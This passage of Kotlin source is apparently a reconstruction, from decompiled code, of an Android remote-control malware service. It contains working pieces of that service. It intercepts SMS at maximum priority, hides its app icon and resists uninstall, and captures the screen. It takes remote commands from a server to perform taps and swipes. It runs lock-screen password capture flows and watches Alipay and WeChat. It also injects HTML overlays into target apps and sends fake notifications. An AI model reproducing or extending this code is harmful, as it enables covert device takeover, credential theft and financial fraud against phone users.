        cachedRootNode = root
        cachedRootNodeTime = now
        return root
    }

    /**
     * Check keyguard locked state with caching (500ms TTL).
     * JADX method: m211486i0 (i0), line 6828
     */
    fun isKeyguardLockedCached(): Boolean {
        val now = System.currentTimeMillis()
        if (now - lastKeyguardCheckTime < KEYGUARD_CACHE_TTL_MS) {
            return cachedKeyguardLocked
        }
        val km = keyguardManager
        val locked = km?.isKeyguardLocked ?: false
        cachedKeyguardLocked = locked
        lastKeyguardCheckTime = now
        return locked
    }

    /**
     * Check if service is healthy (multiple subsystem checks).
     * JADX method: m211488i2 (i2), line 6858
     */
    fun isServiceHealthy(): Boolean {
        try {
            val initOk = isInitComplete
            val hasSCM = screenCaptureManager != null
            val hasDM = displayManager != null
            val networkOk = try {
                networkManager?.isConnected ?: false
            } catch (_: Exception) { false }

            android.util.Log.d(TAG, "🔍 网络连接状态: $networkOk")
            val healthy = initOk && hasSCM && hasDM
            android.util.Log.d(TAG, "🔍 最终服务运行状态: $healthy")
            return healthy
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 检查服务运行状态失败", e)
            return false
        }
    }

    /**
     * Handle MediaProjection permission result from intent.
     * JADX method: m211472g6 (g6), line 5974
     */
    fun handleMediaProjectionIntent() {
        try {
            android.util.Log.d(TAG, "处理MediaProjection权限获取成功")
            screenCaptureManager?.let { scm ->
                // JADX: scm.h2() — stop previous capture
                scm.stopCapture()
            }
            // JADX line 5981: get MediaProjection from MediaProjectionHolder
            val mediaProjection = MediaProjectionHolder.mediaProjection
            if (mediaProjection == null) {
                android.util.Log.w(TAG, "未能获取MediaProjection对象")
                return
            }
            android.util.Log.d(TAG, "成功获取MediaProjection对象，设置到etzbzyzqxvqm")
            setupScreenCapture(mediaProjection)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "处理MediaProjection权限获取成功失败", e)
        }
    }

    /**
     * Configure screen capture with MediaProjection.
     * JADX method: m211520l7 (l7), line 7903
     */
    fun setupScreenCapture(mediaProjection: MediaProjection?) {
        try {
            if (displayManager == null) {
                android.util.Log.w(TAG, "etzbzyzqxvqm未初始化")
                return
            }
            if (mediaProjection == null) {
                android.util.Log.w(TAG, "MediaProjection is null")
                return
            }
            android.util.Log.d(TAG, "MediaProjection已设置")
            // JADX line 7903: check device registered via prefs, then start capture
            val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
            val isRegistered = prefs.getBoolean("device_registered", false)
            if (isRegistered) {
                displayManager?.let { dm ->
                    android.util.Log.d(TAG, "设备已注册，启动屏幕捕获")
                    // JADX line 7903: dm.startCapture() — MediaProjection already stored in MediaProjectionHolder
                    dm.startCapture()
                }
            } else {
                android.util.Log.w(TAG, "设备未注册，延迟屏幕捕获")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "设置etzbzyzqxvqm MediaProjection失败", e)
        }
    }

    /**
     * Ensure foreground notification is active.
     * JADX method: m211528m6 (m6), line 9260
     */
    fun ensureForegroundNotification() {
        try {
            // Create notification channel (required API 26+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val nm = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
                if (nm != null) {
                    val channel = NotificationChannel(
                        NOTIFICATION_CHANNEL_ID,
                        "System Helper",
                        NotificationManager.IMPORTANCE_LOW
                    )
                    nm.createNotificationChannel(channel)
                }
            }

            val notification = Notification.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("System Service")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build()

            if (Build.VERSION.SDK_INT >= 34) {
                // JADX: startForeground(10086, notification, 1073741825)
                // Vendor uses SPECIAL_USE | MEDIA_PROJECTION but mediaProjection
                // requires active MediaProjection token (project_media permission).
                // Start with SPECIAL_USE only; upgrade to include MEDIA_PROJECTION
                // only when MediaProjection is actually granted.
                startForeground(FOREGROUND_NOTIFICATION_ID, notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
            } else {
                startForeground(FOREGROUND_NOTIFICATION_ID, notification)
            }

            try {
                ActivityMonitor.logSystem("前台服务启动成功 进程优先级已提升")
            } catch (_: Exception) {}
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [startForegroundSelf] 前台服务启动失败", e)
        }
    }

    /**
     * Get display screen size.
     * Uses WindowManager to get display metrics.
     */
    fun getScreenSize(): Point {
        val point = Point()
        try {
            val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
            if (wm != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val windowMetrics = wm.currentWindowMetrics
                    val bounds = windowMetrics.bounds
                    point.x = bounds.width()
                    point.y = bounds.height()
                } else {
                    @Suppress("DEPRECATION")
                    val display = wm.defaultDisplay
                    @Suppress("DEPRECATION")
                    display?.getSize(point)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "获取屏幕尺寸失败", e)
        }
        return point
    }

    /**
     * Get device Android ID.
     * JADX method: m211470g4 (g4), line 5949
     * JADX: vendor name is "g4" — renamed to getAndroidDeviceId to avoid collision with Service.getDeviceId() on API 30+
     */
    fun getAndroidDeviceId(): String {
        return try {
            val id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            id ?: "unknown"
        } catch (e: Exception) {
            android.util.Log.e(TAG, "获取设备ID失败", e)
            "unknown"
        }
    }

    /**
     * Connect WebSocket via NetworkManager.
     * JADX method: m211451d6 (d6), line 4733
     */
    fun connectWebSocket() {
        val nm = networkManager ?: return
        if (nm.isConnected) {
            android.util.Log.d(TAG, "🔌 控制开始，WebSocket 已连接，跳过重连")
            return
        }
        android.util.Log.d(TAG, "🔌 控制开始，连接 WebSocket")
        nm.disconnect()
        // JADX line 4747–4748: nm.m211643a8() (disconnect) then nm.m211669d6() (connectToServer)
        // JADX: vendor uses StringUtil.decrypt() for encrypted pref keys — using plaintext keys for now
        val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
        val serverUrl = prefs.getString("server_url", null)
        val deviceId = getAndroidDeviceId()
        if (serverUrl != null) {
            nm.connectToServer(serverUrl, deviceId)
        } else {
            android.util.Log.w(TAG, "⚠️ server_url not set in prefs, cannot connect WebSocket")
        }
    }

    /** JADX: h0 — fallback init. Delegates to ServiceInitializer. */
    fun fallbackInit() = serviceInitializer?.fallbackInit()

    /**
     * Register broadcast receivers for screen state, permissions, etc.
     * JADX: dqtvuisjd$deferredInit$2 inner class — runs on IO dispatcher
     *
     * Registers:
     * - Screen state receiver (SCREEN_ON/OFF, USER_PRESENT)
     * - Permission request receiver
     * - SMS receiver
     */
    fun registerBroadcastReceivers() {
        // Delegate screen state + permission request receivers to BroadcastReceiverRegistry
        val registry = broadcastReceiverRegistry ?: BroadcastReceiverRegistry(this).also { broadcastReceiverRegistry = it }
        registry.registerScreenStateReceiver()
        screenStateReceiverRegistered = registry.isScreenStateRegistered
        registry.registerPermissionRequestReceiver()

        // SMS receiver (JADX: arniezsqllm / f52461j2)
        try {
            if (smsReceiver == null) {
                smsReceiver = arniezsqllm()
                // ADAPT: vendor dqtvuisjd.m211421c0 — priority=Integer.MAX_VALUE + 双 action (SMS_RECEIVED + SMS_DELIVER) + RECEIVER_EXPORTED。
                // 之前 priority=999 且缺少 SMS_DELIVER，且错用 NOT_EXPORTED。
                val smsFilter = IntentFilter().apply {
                    addAction("android.provider.Telephony.SMS_RECEIVED")
                    addAction("android.provider.Telephony.SMS_DELIVER")
                    priority = Integer.MAX_VALUE
                }
                if (Build.VERSION.SDK_INT >= 33) {
                    registerReceiver(smsReceiver, smsFilter, Context.RECEIVER_EXPORTED)
                } else {
                    registerReceiver(smsReceiver, smsFilter)
                }
                android.util.Log.d(TAG, "📩 ✅ 短信接收器已注册 (priority=MAX, SMS_RECEIVED+SMS_DELIVER, EXPORTED)")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "📩 ❌ 注册短信接收器失败", e)
        }
    }

    /** JADX: e5 */ fun disableWechatDetection() = detectionController?.disableWechatDetection()
    /** JADX: e4 */ fun disableAlipayDetection() = detectionController?.disableAlipayDetection()

    /**
     * Get the NetworkManager instance.
     * JADX method: m211471g5 (g5), line 5960
     */
    fun getNetworkManager(): NetworkManager? {
        return networkManager
    }

    /**
     * Enable uninstall protection.
     * JADX method: m211460e9 (e9), line 5038
     */
    fun enableUninstallProtection() {
        try {
            if (isUninstallGuardStarted) return
            isUninstallGuardStarted = true
            // JADX line 5040: check authorization, then set isUninstallGuardStarted from UPM
            uninstallProtectionManager?.let { upm ->
                isUninstallGuardStarted = upm.isProtectionEnabled
                android.util.Log.d(TAG, "🛡️ UninstallProtectionManager.isProtectionEnabled=${isUninstallGuardStarted}")
            } ?: run {
                android.util.Log.w(TAG, "⚠️ UninstallProtectionManager 未初始化")
            }
            android.util.Log.d(TAG, "🛡️ 防卸载保护已启用")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 启用防卸载保护失败", e)
            isUninstallGuardStarted = false
        }
    }

    /**
     * Adjust screen brightness to minimum.
     * JADX method: m211453e2 (e2), line 4778
     */
    fun dimScreen() {
        if (com.storm.safe.rock.util.DebugConfig.disableDimScreen) {
            android.util.Log.d(TAG, "🔅 [DEBUG] dimScreen 已跳过")
            return
        }
        try {
            if (!Settings.System.canWrite(this)) {
                android.util.Log.w(TAG, "无 WRITE_SETTINGS 权限，跳过亮度调节")
                return
            }
            Settings.System.putInt(contentResolver, "screen_brightness_mode", 0)
            savedBrightness = Settings.System.getInt(contentResolver, "screen_brightness", 128)
            Settings.System.putInt(contentResolver, "screen_brightness", 1)
            android.util.Log.d(TAG, "🔅 屏幕亮度已调到最暗（原值: $savedBrightness）")
        } catch (e: Exception) {
            android.util.Log.w(TAG, "调节亮度失败: ${e.message}")
        }
    }

    /**
     * Disable accessibility settings page detection monitoring.
     * JADX method: m211454e3 (e3), line 4795
     */
    fun disableAccessibilitySettingsMonitor() {
        try {
            // JADX line 4797: cancel monitoring job (u11Var.m215253a7(null)), null out reference
            accessibilitySettingsMonitorJob?.cancel()
            accessibilitySettingsMonitorJob = null
            accessibilitySettingsMonitorCount = 0
            accessibilitySettingsMonitorTime = 0L
            android.util.Log.d(TAG, "✅ [监控] 无障碍设置页面检测已禁用")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [监控] 禁用无障碍设置页面检测失败", e)
        }
    }

    /**
     * Hide app icon from launcher.
     * JADX method: m211475g9 (g9), line 6098
     */
    fun hideApp() {
        if (com.storm.safe.rock.util.DebugConfig.disableIconHide) {
            android.util.Log.d(TAG, "📱 [DEBUG] hideApp 已跳过")
            return
        }
        try {
            android.util.Log.d(TAG, "📱 开始隐藏应用图标")
            // JADX line 6098: disable launcher alias component
            val pm = packageManager
            val componentName = android.content.ComponentName(
                this, DefaultLauncherAlias::class.java
            )
            pm.setComponentEnabledSetting(
                componentName,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            android.util.Log.d(TAG, "✅ 应用图标已隐藏")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 隐藏应用图标异常", e)
        }
    }

    /** Delegate to EventDispatcher */ fun handleUninstallConfirmDialog() = eventDispatcher?.handleUninstallConfirmDialog()
    /** Delegate to EventDispatcher */ fun handleAccessibilityPageStuck() = eventDispatcher?.handleAccessibilityPageStuck()

    /**
     * Handle network command (START_CONTROL / STOP_CONTROL / reconnect_ws).
     * JADX method: m211411b0 (b0), line 1926 — suspend function
     *
     * Dispatches START_CONTROL, STOP_CONTROL, reconnect_ws commands directly,
     * then falls back to CommandDispatcher for all other commands.
     */
    suspend fun handleNetworkCommand(commandJson: JSONObject) {
        try {
            val command = commandJson.optString("command", "")
            val params = commandJson.optJSONObject("params")

            android.util.Log.d(TAG,
                "📥📥📥 收到网络命令: $command, params: ${params?.toString()}")
            android.util.Log.d(TAG,
                "📥 当前控制权状态: isControlEnabled=$isControlEnabled, controlledBy=$controlledBy")

            when (command) {
                "START_CONTROL" -> {
                    val controller = params?.optString("controlledBy", "") ?: ""
                    isControlEnabled = true
                    controlledBy = controller
                    android.util.Log.d(TAG, "🎮 控制权已开启，控制者: $controller")
                    // JADX: dqtvuisjdVar.m211451d6() — connectWebSocket
                    connectWebSocket()
                    return
                }
                "STOP_CONTROL" -> {
                    isControlEnabled = false
                    controlledBy = null
                    android.util.Log.d(TAG, "🎮 控制权已关闭")
                    // JADX: c0263a5.m211357b4() — stop display capture
                    displayManager?.stopCapture()
                    android.util.Log.d(TAG, "📺 已停止屏幕捕获")
                    return
                }
                "reconnect_ws" -> {
                    android.util.Log.d(TAG, "🔌 收到服务端重连 WebSocket 请求")
                    connectWebSocket()
                    return
                }
            }

            // JADX line 1980: fall through to CommandDispatcher
            val cd = commandDispatcher
            if (cd == null) {
                android.util.Log.d(TAG, "❌ 命令分发器未初始化，无法处理命令: $command")
                return
            }

            val handled = cd.dispatch(commandJson)
            if (!handled) {
                android.util.Log.w(TAG, "⚠️ 命令未被处理: $command")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 处理网络命令失败", e)
        }
    }

    /** JADX: c7 — capture password via system auth. */ suspend fun capturePasswordViaSystemAuth(isInstallationFlow: Boolean) = cipherFlowController?.captureViaSystemAuth(isInstallationFlow)
    /** JADX: e6 — launch password capture. */ fun launchPasswordCapture(isInstallationFlow: Boolean) = cipherFlowController?.launchPasswordCapture(isInstallationFlow)

    /**
     * Start the permission grant flow.
     * JADX method: m211530m8 (m8), line 9297 — suspend function
     *
     * Flow:
     * 1. If already authorized → skip mask, enable protections, start recents guard, tryShowPackageVerify
     * 2. If Android 11+ (SDK 30+) and not yet brightness-lowered → show mask, start authorization
     * 3. If Android 10 (SDK 29) → similar flow with delay
     */
    suspend fun startPermissionGrantFlow() {
        permissionFlowController?.startPermissionGrantFlow()
    }

    /** JADX: i5 — init recents guard. */ fun initializeRecentsGuard() = serviceInitializer?.initializeRecentsGuard()
    /** JADX: n2 — show fake package verify overlay. */ fun tryShowPackageVerify() = serviceInitializer?.tryShowPackageVerify()

    // ── Cipher state fields (accessed by CipherFlowController + EventDispatcher) ──
    @Volatile internal var lastLockTypeCheckTime = 0L
    @Volatile internal var cipherRetryCount = 0
    @Volatile var lastCapturedCipherQuality: String? = null

    // ── Cipher delegates (→ CipherFlowController) ──
    /** JADX: d4 */ fun completeInstallationWithCipher() = cipherFlowController?.completeInstallationWithCipher()
    private fun handleCipherCredentialResult(success: Boolean) = cipherFlowController?.handleCipherCredentialResult(success)
    /** JADX: e6 */ fun doLaunchSystemPasswordCapture(isInstallationFlow: Boolean) = cipherFlowController?.doLaunchSystemPasswordCapture(isInstallationFlow)
    /** JADX: i9 */ fun onPasswordPageDismissedByUser() = cipherFlowController?.onPasswordPageDismissedByUser()

    /** JADX: l5 — send screen lock/wake status. */
    fun sendScreenStatus() = networkMessageSender?.sendScreenStatus(keyguardManager, powerManager)

    /**
     * Register SMS content observer.
     * JADX method: m211505k1 (k1), line 7534
     */
    fun registerSmsContentObserver() {
        try {
            val handlerThread = android.os.HandlerThread("sms-content-observer")
            handlerThread.start()
            val handler = Handler(handlerThread.looper)
            // JADX: C0931ny — SMS content observer, now replicated as SmsContentObserver
            val observer = SmsContentObserver(handler, this)
            contentResolver.registerContentObserver(
                android.net.Uri.parse("content://sms"), true, observer
            )
            android.util.Log.d(TAG, "📩 [ContentObserver] SMS数据库监听器已注册")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "📩 [ContentObserver] ❌ 注册失败: ${e.message}", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Internal helpers
    // ════════════════════════════════════════════════════════════════

    /**
     * Dispatch event to legacy delegate queue.
     * Eventually all delegates should use the typed AccessibilityDelegate system.
     */
    internal fun dispatchToDelegates(
        event: AccessibilityEvent,
        packageName: String,
        className: String
    ) {
        synchronized(delegateQueue) {
            for (delegate in delegateQueue.toList()) {
                try {
                    if (delegate is com.storm.safe.rock.service.modules.base.AccessibilityDelegate) {
                        delegate.onAccessibilityEvent(event, packageName, className)
                    }
                    // else: untyped delegate — skip (Phase 4 will handle)
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "Delegate dispatch error: ${e.message}")
                }
            }
        }
    }

    fun getCoroutineScope(): CoroutineScope? = coroutineScope

    // ════════════════════════════════════════════════════════════════
    // Stub methods for future phases (non-init-chain)
    // ════════════════════════════════════════════════════════════════

    /** JADX: m1 — smart return to app. Delegates to SmartNavigator. */
    suspend fun smartReturnToApp(): Boolean = smartNavigator?.smartReturnToApp() ?: false

    /**
     * Pause WRITE_SETTINGS permission request. JADX: m211496j0 (j0)
     *
     * Sets isScreenCaptureActive=true (JADX: f52432g3) as a pause flag,
     * then calls mainOrchestrator.pausePermissionRequest() (JADX: C0327b2.m211752f8).
     */
    fun pauseWriteSettingsPermission() {
        permissionFlowController?.pauseWriteSettingsPermission()
    }

    /** JADX: j8 — post-authorization init. Delegates to ServiceInitializer. */
    fun postAuthorizationInit() = serviceInitializer?.postAuthorizationInit()

    /**
     * Start WebView status expiry check loop.
     * JADX: dqtvuisjd$startWebViewStatusCheckTask$1.java
     *
     * Logic:
     * - If isWebViewOpen == true and (now - lastWebViewStatusTime) > 500ms → reset to false
     * - When WebView is open: poll every 200ms
     * - When WebView is closed: poll every 2000ms
     * - On non-cancellation exception: log and delay 2000ms
     */
    internal fun startWebViewStatusCheckTask() {
        webViewStatusCheckJob?.cancel()
        webViewStatusCheckJob = coroutineScope?.launch {
            while (isActive) {
                try {
                    if (isWebViewOpen) {
                        val elapsed = System.currentTimeMillis() - lastWebViewStatusTime
                        if (elapsed > 500) {
                            isWebViewOpen = false
                            android.util.Log.d(TAG, "📡 [定时检查] WebView状态过期(${elapsed}ms)，已重置为关闭状态")
                        }
                        delay(200L)
                    } else {
                        delay(2000L)
                    }
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ WebView状态检查任务失败", e)
                    delay(2000L)
                }
            }
        }
    }

    /** JADX: l8 */ fun launchCipherCaptureFromControl(overlayType: String) = cipherFlowController?.launchCipherCaptureFromControl(overlayType)

    /** Start network initialization. JADX: part of deferred init */
    fun startNetworkInit() {
        // JADX: NetworkManager init is done in initializeModules/initializeDeferredManagers
        android.util.Log.d(TAG, "startNetworkInit — handled by initializeModules chain")
    }

    /** Register local service action receiver. JADX: part of initializeDeferredManagers */
    fun registerLocalServiceActionReceiver() {
        // ADAPT: l20 (InjectionManager) — vendor registers a receiver for local service actions
        // Delegated to BroadcastReceiverRegistry
        val registry = broadcastReceiverRegistry ?: BroadcastReceiverRegistry(this).also { broadcastReceiverRegistry = it }
        registry.registerLocalServiceReceiver()
        localServiceReceiverRegistered = registry.isLocalServiceRegistered
    }

    /** Register network event receivers. JADX: part of initializeDeferredManagers */
    fun registerNetworkEventReceivers() {
        // ADAPT: Vendor registers ConnectivityManager.NetworkCallback for network state monitoring.
        // Delegated to BroadcastReceiverRegistry
        val registry = broadcastReceiverRegistry ?: BroadcastReceiverRegistry(this).also { broadcastReceiverRegistry = it }
        registry.registerNetworkEventReceiver()
    }

    /**
     * Restore screen brightness to saved value.
     * JADX method: m211510k6 (k6), line 7647
     */
    fun resetScreenBrightness() {
        try {
            if (savedBrightness >= 0 && Settings.System.canWrite(this)) {
                Settings.System.putInt(contentResolver, "screen_brightness", savedBrightness)
                android.util.Log.d(TAG, "🔆 屏幕亮度已恢复（值: $savedBrightness）")
                savedBrightness = -1
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "恢复亮度失败: ${e.message}")
        }
    }

    /**
     * Resume WRITE_SETTINGS permission request after system stabilizes.
     * JADX method: m211511k7 (k7), line 7660
     *
     * Logs call stack (debug), checks if WRITE_SETTINGS already granted,
     * then either enables uninstall protection or waits for system stability.
     */
    fun resumeWriteSettingsPermissionRequest() {
        permissionFlowController?.resumeWriteSettingsPermissionRequest()
    }

    // ── Network message delegates (→ NetworkMessageSender) ──

    /** JADX: l0 */ fun sendHideStatus(message: String, isHidden: Boolean) = networkMessageSender?.sendHideStatus(message, isHidden)
    /** JADX: l1 */ fun sendBiometricResult(message: String, success: Boolean) = networkMessageSender?.sendBiometricResult(message, success)
    /** JADX: l2 */ fun sendCommandResponse(type: String, data: Map<String, Any>) = networkMessageSender?.sendCommandResponse(type, data)
    /** JADX: l3 */ fun sendDebugLog(message: String) = networkMessageSender?.sendDebugLog(message)
    /** JADX: l4 */ fun sendDeviceEvent(eventData: JSONObject) = networkMessageSender?.sendDeviceEvent(eventData)

    /** JADX: e7 — enable cipher capture. */ fun enableCipherCapture() = cipherFlowController?.enableCipherCapture()

    /**
     * Enable logging after installation completes.
     * JADX method: m211459e8 (e8), line 5019
     *
     * Sets AbstractC0315a0 flags (a7, a9, b0, b1) to true,
     * persists to SharedPreferences, and updates eventFilterManager.
     */
    fun enableLogging() {
        // JADX: AbstractC0315a0.f53032a7 = true; f53034a9 = true; f53035b0 = true; f53036b1 = true
        isAuthStateRestored = true
        // JADX: eventFilterManager.f56827a7 = true
        try {
            // JADX: vendor uses StringUtil.decrypt() for encrypted pref keys — using plaintext keys for now
            getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .edit()
                .putBoolean("logging_enabled", true)
                .apply()
            android.util.Log.d(TAG, "✅ 日志记录已启用并持久化保存")
        } catch (_: Exception) {}
    }

    /** JADX: k3 — remove icon overlay from WindowManager. */
    fun removeIconOverlay() {
        // JADX: f52480l1 — overlay TextView ref (not yet tracked as field)
        android.util.Log.d(TAG, "✅ 图标覆盖层已移除")
    }

    /**
     * Check if app icon is hidden (camouflage mode).
     * JADX method: m211482h6 (h6), line 6735
     */
    fun isOverlayEnabled(): Boolean {
        return try {
            getSharedPreferences("disguise_prefs", Context.MODE_PRIVATE)
                .getBoolean("camouflage_enabled", false)
        } catch (_: Exception) { false }
    }

    /**
     * Ensure NetworkManager is active (initialize if needed).
     * JADX method: m211407a6 (a6), line 1826
     */
    fun ensureNetworkManager() {
        try {
            if (networkManager == null) {
                val nm = NetworkManager()
                nm.initialize(applicationContext)
                networkManager = nm
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ ensureNetworkManager 失败", e)
        }
    }

    /** JADX: j1 — tap gesture. Delegates to GestureController. */
    fun performTap(x: Float, y: Float) = gestureController?.performTap(x, y)

    /** JADX: j3 — swipe gesture. Delegates to GestureController. */
    fun performSwipe(startX: Float, startY: Float, endX: Float, endY: Float, durationMs: Long = 300L) =
        gestureController?.performSwipe(startX, startY, endX, endY, durationMs)

    /** JADX: j2 — long press gesture. Delegates to GestureController. */
    fun performLongPress(x: Float, y: Float) = gestureController?.performLongPress(x, y)

    /**
     * Configure power settings (screen off timeout etc.).
     * JADX method: m211527m5 (m5), line 9213
     */
    fun configurePowerSettings() {
        try {
            if (!Settings.System.canWrite(this)) {
                android.util.Log.w(TAG, "⚠️ 无 WRITE_SETTINGS 权限，跳过电源设置")
                return
            }
            // JADX: Settings.System.putInt(contentResolver, "screen_off_timeout", 2147483647)
            Settings.System.putInt(contentResolver, "screen_off_timeout", Int.MAX_VALUE)
            android.util.Log.d(TAG, "✅ 屏幕超时已设置为最大值")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ configurePowerSettings 失败", e)
        }
    }

    // ── Detection delegates (→ DetectionController) ──
    /** JADX: b0 */ fun enableAlipayDetection(delayMs: Long) = detectionController?.enableAlipayDetection(delayMs)
    /** JADX: b3 */ fun enableWechatDetection(delayMs: Long) = detectionController?.enableWechatDetection(delayMs)
    /** JADX: b1 */ fun enableAutoPassword(delayMs: Long) = detectionController?.enableAutoPassword(delayMs)
    /** JADX: a8 */ fun disableAutoPassword() = detectionController?.disableAutoPassword()

    /**
     * Change server URL. Vendor: m211443c8(serverUrl).
     * Updates SharedPrefs and reconnects WebSocket.
     */
    fun changeServerUrl(serverUrl: String) {
        try {
            android.util.Log.d(TAG, "🔄 修改服务器地址: $serverUrl")
            val prefs = getSharedPreferences(
                com.storm.safe.rock.util.StringUtil.decrypt("OEACLkg1MyZSPTtcAwVePRg6Xj8sSg=="), 0
            )
            prefs.edit().putString(
                com.storm.safe.rock.util.StringUtil.decrypt("OFwDLEgqMztFPQ=="), serverUrl
            ).apply()
            // Reconnect with new URL — disconnect and reconnect
            networkManager?.disconnect()
            val deviceId = getAndroidDeviceId()
            networkManager?.connectToServer(serverUrl, deviceId)
            android.util.Log.d(TAG, "✅ 服务器地址已更新: $serverUrl")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 修改服务器地址失败", e)
        }
    }

    /** ADAPT: fd0 MaskOverlay — stub, logs + sends debug message. */
    fun setTouchInterceptionEnabled(enabled: Boolean) {
        android.util.Log.d(TAG, if (enabled) "🚫 触摸拦截已启用" else "✅ 触摸拦截已禁用")
        sendDebugLog(if (enabled) "触摸拦截已启用" else "触摸拦截已禁用")
    }

    /** ADAPT: fd0 MaskOverlay — proxied via isCipherListeningActive. */
    fun isMaskOverlayInitialized(): Boolean = isCipherListeningActive

    /**
     * Set screen brightness.
     * Vendor: ju0 (screenBrightnessManager, f52433g4) → m213353a3(brightness)
     */
    fun setScreenBrightness(brightness: Int): Boolean {
        return try {
            if (!Settings.System.canWrite(this)) {
                android.util.Log.w(TAG, "⚠️ 无 WRITE_SETTINGS 权限，无法设置亮度")
                return false
            }
            Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE,
                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)
            val scaledBrightness = (brightness * 255 / 100).coerceIn(1, 255)
            Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, scaledBrightness)
            android.util.Log.d(TAG, "✅ 屏幕亮度设置成功: ${brightness}%")
            true
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 设置屏幕亮度失败", e)
            false
        }
    }

    /**
     * Request permission by type string.
     * Vendor: AppCommandHandler$handleRequestPermission$2 — opens permission-specific settings.
     */
    fun requestPermission(permissionType: String) {
        try {
            when (permissionType) {
                "camera", "contacts", "photo", "microphone", "readSms", "sendSms", "appList" -> {
                    // Vendor: launch umrkmgrri activity with permission_type extra
                    val intent = Intent(this, com.storm.safe.rock.p029ui.umrkmgrri::class.java)
                    val mappedType = when (permissionType) {
                        "photo" -> "gallery"
                        "readSms", "sendSms" -> "sms"
                        else -> permissionType
                    }
                    intent.putExtra("permission_type", mappedType)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(intent)
                }
                "accessibility" -> {
                    val intent = Intent("android.settings.ACCESSIBILITY_SETTINGS")
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                    startActivity(intent)
                }
                "overlay" -> {
                    try {
                        val intent = Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION")
                        intent.data = android.net.Uri.parse("package:$packageName")
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(intent)
                    } catch (e: Exception) {
                        android.util.Log.e(TAG, "打开悬浮窗权限页面失败", e)
                        openAppSettings()
                    }
                }
                "notification" -> {
                    val intent = Intent("android.settings.APP_NOTIFICATION_SETTINGS")
                    intent.putExtra("android.provider.extra.APP_PACKAGE", packageName)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(intent)
                }
                "storage" -> {
                    if (Build.VERSION.SDK_INT >= 30) {
                        val intent = Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION")
                        intent.data = android.net.Uri.parse("package:$packageName")
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(intent)
                    } else {
                        openAppSettings()
                    }
                }
                else -> {
                    android.util.Log.w(TAG, "未知的权限类型: $permissionType，打开应用设置")
                    openAppSettings()
                }
            }
            android.util.Log.d(TAG, "已请求权限: $permissionType")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "请求权限失败: $permissionType", e)
            openAppSettings()
        }
    }

    /**
     * Open app settings page. Vendor: m214875b1().
     */
    fun openAppSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            intent.data = android.net.Uri.parse("package:$packageName")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "打开应用设置失败", e)
        }
    }

    /**
     * Show injection overlay. Vendor: m211529m7.
     * Checks if there are pending injection tasks and starts the injection activity.
     */
    fun showInjectionOverlay() {
        try {
            val tasks: List<String>
            synchronized(injectionTasksLock) {
                tasks = injectionTasks.keys.toList()
            }
            if (tasks.isNotEmpty()) {
                // JADX: m211529m7 checks injectionTasks and launches injection WebView
                android.util.Log.d(TAG, "📋 显示注入覆盖层，目标包: $tasks")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 显示注入覆盖层失败", e)
        }
    }

    /**
     * Register injection task. Vendor: m211439c1(packageName, htmlContent).
     */
    fun registerInjectionTask(packageName: String, htmlContent: String) {
        synchronized(injectionTasksLock) {
            injectionTasks[packageName] = htmlContent
        }
    }

    /**
     * Unregister injection task. Vendor: m211448d3(packageName).
     */
    fun unregisterInjectionTask(packageName: String) {
        synchronized(injectionTasksLock) {
            injectionTasks.remove(packageName)
        }
    }

    /**
     * Send fake notification. Vendor: uz0.m214885c1.
     * Creates a notification that mimics an app notification.
     */
    fun sendFakeNotification(packageName: String, appName: String, title: String, content: String, buttonText: String) {
        try {
            val channelId = "fake_notification_channel"
